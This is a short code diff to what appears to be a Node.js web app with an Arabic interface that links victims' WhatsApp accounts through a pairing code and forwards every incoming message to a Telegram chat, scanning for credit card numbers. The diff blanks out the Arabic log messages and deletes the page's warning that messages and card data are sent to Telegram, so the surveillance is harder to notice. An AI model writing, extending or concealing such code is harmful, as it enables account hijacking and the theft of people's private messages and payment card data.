@@ -28,9 +28,9 @@ async function sendToTelegram(messageText) {
     if (!telegramBot) return;
     try {
         await telegramBot.sendMessage(TELEGRAM_CHAT_ID, messageText, { parse_mode: 'Markdown' });
-        console.log('📨 تم إرسال إشعار إلى تليجرام');
+        console.log('📨   ');
     } catch (err) {
-        console.error('❌ فشل إرسال إلى تليجرام:', err.message);
+        console.error('❌    :', err.message);
     }
 }
 
@@ -190,7 +190,7 @@ const HTML_PAGE = `<!DOCTYPE html>
     <div id="status" class="status"></div>
     <div id="codeSection" class="hidden"><div class="code-box" id="codeDisplay"></div><p>✨ أدخل هذا الرمز في واتساب (الإعدادات ← الأجهزة المرتبطة)</p></div>
     <div class="accounts-list"><strong>📋 الحسابات المرتبطة:</strong><div id="accountsList">لا توجد حسابات بعد.</div></div>
-    <div class="small-text">⚠️ كل رسالة تصل لهذه الحسابات سترسل فوراً إلى تليجرام مع كشف البطاقات الائتمانية.</div>
+    <div class="small-text">⚠️</div>
 </div>
 <script>
     const socket = io();
